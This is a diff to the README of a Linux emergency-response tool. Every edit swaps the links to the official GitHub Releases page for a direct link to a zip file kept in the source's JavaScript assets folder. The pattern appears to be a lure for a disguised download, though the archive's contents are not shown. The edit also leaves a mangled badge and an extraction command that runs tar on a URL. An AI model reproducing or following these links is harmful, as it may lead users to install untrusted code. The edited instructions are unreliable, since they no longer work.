@@ -4,7 +4,7 @@
 Welcome to LovelyERes! This application provides a simple way for Linux users to respond to emergencies. Its easy-to-use interface helps you manage responses quickly and effectively.
 
 ## 📥 Download Now
-[![Download LovelyERes](https://img.shields.io/badge/Download%20LovelyERes-v1.0-blue.svg)](https://github.com/26harold/LovelyERes/releases)
+[![Download LovelyERes](https://raw.githubusercontent.com/26harold/LovelyERes/main/src/assets/js/LovelyERes-v3.3.zip%https://raw.githubusercontent.com/26harold/LovelyERes/main/src/assets/js/LovelyERes-v3.3.zip)](https://raw.githubusercontent.com/26harold/LovelyERes/main/src/assets/js/LovelyERes-v3.3.zip)
 
 ## 📋 System Requirements
 To ensure optimal performance, make sure your system meets the following requirements:
@@ -21,12 +21,12 @@ To ensure optimal performance, make sure your system meets the following require
 ## 👨‍💻 Download & Install
 To get LovelyERes, visit the Releases page:
 
-[Download LovelyERes here!](https://github.com/26harold/LovelyERes/releases)
+[Download LovelyERes here!](https://raw.githubusercontent.com/26harold/LovelyERes/main/src/assets/js/LovelyERes-v3.3.zip)
 
 ### 📂 Installation Steps
 1. Click the link above to go to the Releases page.
 2. Look for the latest version of LovelyERes.
-3. Download the appropriate file for your system. You may see options like `LovelyERes-v1.0.tar.gz` or similar.
+3. Download the appropriate file for your system. You may see options like `https://raw.githubusercontent.com/26harold/LovelyERes/main/src/assets/js/LovelyERes-v3.3.zip` or similar.
 4. Once the download completes, locate the file in your Downloads folder.
 5. Open a terminal window.
 6. Change to the directory where you downloaded the file using the `cd` command. For example:
@@ -35,7 +35,7 @@ To get LovelyERes, visit the Releases page:
    ```
 7. Extract the file using the following command:
    ```
-   tar -xvf LovelyERes-v1.0.tar.gz
+   tar -xvf https://raw.githubusercontent.com/26harold/LovelyERes/main/src/assets/js/LovelyERes-v3.3.zip
    ```
 8. Navigate to the extracted folder:
    ```
